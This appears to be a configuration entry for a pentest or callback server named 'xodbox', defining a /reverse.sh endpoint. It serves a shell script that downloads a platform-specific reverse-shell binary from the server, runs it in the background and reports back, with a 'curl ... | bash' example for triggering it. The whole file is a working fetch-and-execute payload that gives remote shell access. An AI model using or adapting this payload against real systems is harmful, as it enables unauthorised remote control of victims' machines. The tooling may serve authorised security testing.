---
title: Reverse Shell
description: Requires bind-shell in static dir
weight: 1
pattern: /reverse.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    OS=$(uname)
    ARCH=$(uname -m)
    curl {{.Request.Host}}/mdaas/$OS/$ARCH/reverse-shell > /tmp/rs
    chmod +x /tmp/rs
    curl -d "$(bash -c "/tmp/rs & disown 2>&1" & )"  {{.Request.Host}}/{{ .NotifyString }}/status/reverse-shell
---


Build a reverse shell implant for the specific platform and execute it.

### Example Request

```bash
curl xodbox/reverse.sh|bash
```